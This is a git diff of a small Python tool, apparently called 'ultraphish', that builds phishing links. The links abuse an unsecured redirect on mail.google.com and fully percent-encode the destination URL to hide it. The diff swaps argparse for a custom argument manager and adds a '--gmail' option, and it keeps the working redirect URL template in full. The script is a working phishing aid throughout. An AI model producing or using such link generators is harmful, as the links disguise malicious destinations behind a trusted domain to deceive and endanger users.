@@ -1,5 +1,6 @@
-import argparse
-import sys
+from argument_manager import parser
+from argument_manager.parser import ParameterError, ActionError
+import  sys
 
 print (""" _   _ _    ___________  ___ ______ _   _ _____ _____ _   _ 
 | | | | |  |_   _| ___ \/ _ \| ___ \ | | |_   _/  ___| | | |
@@ -15,19 +16,27 @@ def url_encode_all_chars(url):
     encoded = url.encode('utf-8').hex()
     return '%' + '%'.join(a+b for a,b in zip(encoded[::2], encoded[1::2]))
 
-def printUrl(src):
-    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" % url_encode_all_chars(src))
+def gmail_redirect(values):
+    print("https://mail.google.com/webhp#?uid=Z2l0aHViLmNvbS92bHA0NDM=&q=%s=&btnI=I" % url_encode_all_chars(values.get_dest()))
 
 
+argManager = parser.get_manager()\
+    .add_value('--dest', metavar='Destination URL (for gmail)', nargs=1)
 
-parser = argparse.ArgumentParser(description='Generate links to google searchable urls using unsecured redirects in mail.google.com.'
-                                             'Usage python3 ./ultraphish.py --url <url>')
-parser.add_argument('--url', metavar='Location to link to e.g. https://cutecatsinhats.com', type=printUrl, nargs=1)
+argManager.add_action(argManager.print_help, '--help', help='Show this message', action='store_true')\
+    .add_action(gmail_redirect, '--gmail', help='Redirect vial mail.google.com', action='store_true')
 
 try:
-    if (len(sys.argv) < 2):
-        raise Exception
-    args = parser.parse_args()
-except :
-    parser.print_help()
-    exit(1)
+    if len(sys.argv) > 1:
+        argManager.exec()
+    else:
+        argManager.print_help()
+
+except (ParameterError) as e:
+    if argManager.get_current_action() is None:
+        print('Input parameter Error: "%s"' % e)
+    else:
+        print('Input parameter Error: "%s" while executing the %s command: ' % e, argManager.get_current_action())
+
+except ActionError as e:
+    print("Action Error: " +  str(e))
